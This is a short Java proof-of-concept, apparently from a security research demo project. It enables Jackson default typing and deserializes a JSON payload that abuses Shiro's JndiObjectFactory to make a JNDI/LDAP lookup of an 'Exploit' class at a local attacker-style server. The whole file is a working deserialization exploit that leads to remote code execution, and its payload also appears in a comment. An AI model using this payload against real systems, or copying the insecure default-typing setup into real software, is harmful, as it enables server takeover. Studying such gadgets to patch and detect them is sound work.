package me.mole.jackson.demo;

import com.fasterxml.jackson.databind.ObjectMapper;


public class JacksonDemo {
    public static void main(String[] args) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            //["org.apache.shiro.jndi.JndiObjectFactory",{"resourceName":"ldap://127.0.0.1:8384/Exploit"}]
            String jsonStr = "[\"org.apache.shiro.jndi.JndiObjectFactory\",{\"resourceName\":\"ldap://127.0.0.1:8384/Exploit\"}]";
            Object obj = mapper.readValue(jsonStr, Object.class);
            mapper.writeValueAsString(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
